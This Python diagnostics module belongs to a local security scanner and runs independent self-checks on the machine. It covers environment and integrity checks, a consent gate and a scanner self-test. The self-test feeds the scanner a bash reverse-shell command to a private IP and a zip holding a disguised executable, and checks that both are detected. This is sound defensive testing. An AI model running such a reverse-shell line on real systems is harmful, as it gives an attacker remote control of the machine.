"""Built-in diagnostics and scanner self-test.

Purpose: tell the user (and whoever helps them) exactly what works on THIS machine, with real timings, instead of guessing.
Every check is independent: one failing or crashing check never stops the others. The report masks the user name and home folder.
"""
from __future__ import annotations

import io
import os
import platform
import shutil
import sys
import tempfile
import time
import zipfile
from datetime import datetime
from pathlib import Path
from typing import Any, Callable

from .shield import defender
from .shield.quarantine import ConsentRequired
from .shield.scanner import EICAR, PANZERON_MARKER, PANZERON_SIM, Scanner, inspect_content

PASS, WARN, FAIL, INFO = "pass", "warn", "fail", "info"


def _timed(fn: Callable[[], tuple[str, str]]) -> tuple[str, str, int]:
    t = time.perf_counter()
    try:
        status, detail = fn()
    except Exception as e:                      # a crashing check is reported, never fatal
        status, detail = FAIL, f"check crashed: {type(e).__name__}: {e}"
    return status, detail, int((time.perf_counter() - t) * 1000)


def _check_python() -> tuple[str, str]:
    v = sys.version_info
    return (PASS if v >= (3, 11) else WARN), f"Python {v.major}.{v.minor}.{v.micro}" + ("" if v >= (3, 11) else " (3.11 or newer is recommended)")


def _check_window_engine() -> tuple[str, str]:
    from .desktop import find_app_browser
    exe = find_app_browser()
    return (PASS, f"{Path(exe).name} found") if exe else (WARN, "Microsoft Edge or Chrome not found: the app window cannot open (use --server-only for a browser tab)")


def _check_dialogs() -> tuple[str, str]:
    try:
        import tkinter  # noqa: F401
        return PASS, "tkinter available: native file and folder dialogs can open"
    except Exception as e:
        if sys.platform == "win32" and shutil.which("powershell"):
            return WARN, f"tkinter missing ({e}); the PowerShell dialog fallback will be used"
        return WARN, f"native dialogs unavailable ({e}); you can type paths instead"


def _check_images() -> tuple[str, str]:
    from .vision import extract
    problems = []
    if not extract.PIL_OK:
        problems.append("Pillow missing (image metadata and redaction unavailable)")
    ocr = extract.ocr_status()
    if not ocr["available"]:
        problems.append(f"OCR unavailable: {ocr['reason']}")
    return (WARN, "; ".join(problems)) if problems else (PASS, f"Pillow and OCR ready ({ocr['path']})")


def _check_pdf() -> tuple[str, str]:
    try:
        import fitz  # noqa: F401
        return PASS, "PyMuPDF available"
    except ImportError:
        return (PASS, "pdftotext available") if shutil.which("pdftotext") else (WARN, "no PDF text extractor (pip install pymupdf)")


def _check_powershell() -> tuple[str, str]:
    if sys.platform != "win32":
        return INFO, "not Windows: PowerShell-based features are unavailable here"
    t = time.perf_counter()
    cp = defender._ps("$PSVersionTable.PSVersion.ToString()", timeout=30)
    ms = int((time.perf_counter() - t) * 1000)
    if cp.returncode != 0:
        return FAIL, f"PowerShell failed: {(cp.stderr or '').strip()[:120]}"
    return (PASS if ms < 3000 else WARN), f"PowerShell {cp.stdout.strip()} starts in {ms} ms" + ("" if ms < 3000 else " (slow: background caching hides this from the interface)")


def _check_windows_security() -> tuple[str, str]:
    if sys.platform != "win32":
        return INFO, "not Windows: Windows Security is not present"
    t = time.perf_counter()
    snap = defender.snapshot()
    ms = int((time.perf_counter() - t) * 1000)
    st = snap["status"]
    if not st.get("available"):
        return WARN, f"Windows Security status unavailable after {ms} ms: {st.get('reason')}"
    return PASS, (f"Defender read in {ms} ms: antivirus {'on' if st.get('antivirus_enabled') else 'OFF'}, "
                  f"real-time {'on' if st.get('realtime_protection') else 'OFF'}, signatures {st.get('signature_version')}")


def _check_ollama(app) -> tuple[str, str]:
    p = __import__("panzeron.ai.provider", fromlist=["provider_from_settings"]).provider_from_settings(app.settings())
    if p is None:
        return INFO, "local AI is turned off in Settings"
    st = p.status()
    return (PASS, f"Ollama reachable, model {st['model']} installed") if st.get("available") else (INFO, f"Ollama not ready: {st.get('reason')} (optional)")


def _check_data_dir(app) -> tuple[str, str]:
    d = app.paths.home
    probe = d / ".write_probe"
    probe.write_text("ok"); probe.unlink()
    free = shutil.disk_usage(d).free / 1024 ** 3
    return (PASS if free >= 1 else WARN), f"data folder writable; {free:.1f} GB free"


def _check_database(app) -> tuple[str, str]:
    r = app.db.query("PRAGMA integrity_check")[0]
    ok = list(r.values())[0] == "ok"
    n = app.db.query("SELECT COUNT(*) AS n FROM findings")[0]["n"]
    return (PASS if ok else FAIL), f"database integrity {'ok' if ok else 'FAILED'}; {n} findings stored"


def _check_audit(app) -> tuple[str, str]:
    v = app.audit.verify()
    return (PASS, f"hash chain verified over {v['entries']} entries") if v["ok"] else (FAIL, f"audit log altered at entry #{v['first_broken_seq']}")


def _check_integrity(app) -> tuple[str, str]:
    v = app.trust.verify()
    if not v["manifest_found"]:
        return WARN, "no integrity manifest: Panzeron cannot recognise its own files, so scanning its folder may flag it"
    if v["modified"] or v["unexpected_programs"]:
        return FAIL, f"{len(v['modified'])} file(s) modified, {len(v['unexpected_programs'])} unexpected program(s): {', '.join((v['modified'] + v['unexpected_programs'])[:3])}"
    return PASS, f"all {v['checked']} program files match the shipped manifest"


def _check_scanner_selftest() -> tuple[str, str]:
    salt = b"d" * 32
    zbuf = io.BytesIO()
    with zipfile.ZipFile(zbuf, "w") as z:
        z.writestr("invoice.pdf", b"MZ" + b"\x90" * 120)
    from .shield import containers
    zfind = containers.inspect_zip(io.BytesIO(zbuf.getvalue()), "a.zip", None, salt, lambda n, d, p, s, sha, depth=0: inspect_content(n, d, p, s, sha, depth=depth))
    cases = [
        ("simulated threat is High", [f.severity.value for f in inspect_content("a.txt", PANZERON_SIM, None, salt, "0")] == ["high"]),
        ("test file is Low", [f.severity.value for f in inspect_content("a.txt", EICAR, None, salt, "0")] == ["low"]),
        ("test string inside a big file is Info", [f.severity.value for f in inspect_content("a.md", b"x" * 600 + PANZERON_MARKER, None, salt, "0")] == ["info"]),
        ("ordinary text is clean", inspect_content("notes.txt", b"Meeting at 3pm. Bring the notes.", None, salt, "0") == []),
        ("reverse shell is detected", any(f.severity.value == "high" for f in inspect_content("a.sh", b"bash -i >& /dev/tcp/10.0.0.1/4444 0>&1", None, salt, "0"))),
        ("disguised program in an archive is found", any(f.category == "shield.archive_disguised" for f in zfind)),
    ]
    bad = [name for name, ok in cases if not ok]
    return (FAIL, "failed: " + "; ".join(bad)) if bad else (PASS, f"all {len(cases)} detection cases behave as designed")


def _check_throughput() -> tuple[str, str]:
    d = Path(tempfile.mkdtemp(prefix="um_bench_"))
    try:
        for i in range(6):
            (d / f"big{i}.bin").write_bytes(os.urandom(2 * 1024 * 1024))
        for i in range(300):
            (d / f"small{i}.txt").write_text(f"file {i} " * 20)
        t = time.perf_counter()
        res, _ = Scanner(b"d" * 32, mode="deep").scan(str(d))
        dt = max(time.perf_counter() - t, 1e-6)
        return INFO, f"{res.files_scanned / dt:,.0f} files/s and {res.bytes_scanned / 1048576 / dt:,.0f} MB/s on {Scanner(b'x' * 32).workers} threads (synthetic benchmark, deep mode)"
    finally:
        shutil.rmtree(d, ignore_errors=True)


def _check_consent_gate(app) -> tuple[str, str]:
    before = len(app.scan_history())
    try:
        app.start_scan(scope="user")
    except ConsentRequired:
        return (PASS, "a broad scan is refused without your permission and reads nothing") if len(app.scan_history()) == before else (FAIL, "refused but a scan record was created")
    return FAIL, "a broad scan started WITHOUT consent"


def run(app) -> dict[str, Any]:
    plan: list[tuple[str, str, Callable[[], tuple[str, str]]]] = [
        ("python", "Python", _check_python),
        ("window", "App window engine (Edge/Chrome)", _check_window_engine),
        ("dialogs", "Native file and folder dialogs", _check_dialogs),
        ("images", "Image analysis and OCR", _check_images),
        ("pdf", "PDF text extraction", _check_pdf),
        ("powershell", "PowerShell startup time", _check_powershell),
        ("winsec", "Windows Security (Defender) access", _check_windows_security),
        ("ollama", "Local AI (Ollama)", lambda: _check_ollama(app)),
        ("datadir", "Data folder", lambda: _check_data_dir(app)),
        ("database", "Database", lambda: _check_database(app)),
        ("audit", "Audit log integrity", lambda: _check_audit(app)),
        ("integrity", "Panzeron's own files", lambda: _check_integrity(app)),
        ("selftest", "Scanner self-test", _check_scanner_selftest),
        ("consent", "Permission gate for broad scans", lambda: _check_consent_gate(app)),
        ("throughput", "Scan speed (synthetic)", _check_throughput),
    ]
    checks = []
    for cid, label, fn in plan:
        status, detail, ms = _timed(fn)
        checks.append({"id": cid, "label": label, "status": status, "detail": detail, "ms": ms})
    counts = {k: sum(1 for c in checks if c["status"] == k) for k in (PASS, WARN, FAIL, INFO)}
    result = {"finished_at": datetime.now().isoformat(timespec="seconds"), "checks": checks, "counts": counts, "ok": counts[FAIL] == 0}
    result["report"] = report_text(app, result)
    return result


def _mask(text: str) -> str:
    home = str(Path.home())
    user = os.environ.get("USERNAME") or os.environ.get("USER") or ""
    out = text.replace(home, "~")
    return out.replace(user, "<user>") if len(user) > 2 else out


def report_text(app, result: dict[str, Any]) -> str:
    sysinfo = app.system_info()
    lines = [f"Panzeron diagnostics report  ({result['finished_at']})", f"Version {sysinfo['app_version']} | {sysinfo['os']} | Python {sysinfo['python']} | {sysinfo['cpu_threads']} CPU threads | {sysinfo['memory_gb']} GB RAM",
             "Personal details (user name, home folder) are masked in this report.", ""]
    tag = {PASS: "PASS", WARN: "WARN", FAIL: "FAIL", INFO: "INFO"}
    for c in result["checks"]:
        lines.append(f"[{tag[c['status']]}] {c['label']}: {c['detail']} ({c['ms']} ms)")
    cnt = result["counts"]
    lines += ["", f"Summary: {cnt[PASS]} passed, {cnt[WARN]} warnings, {cnt[FAIL]} failed, {cnt[INFO]} informational"]
    return _mask("\n".join(lines))
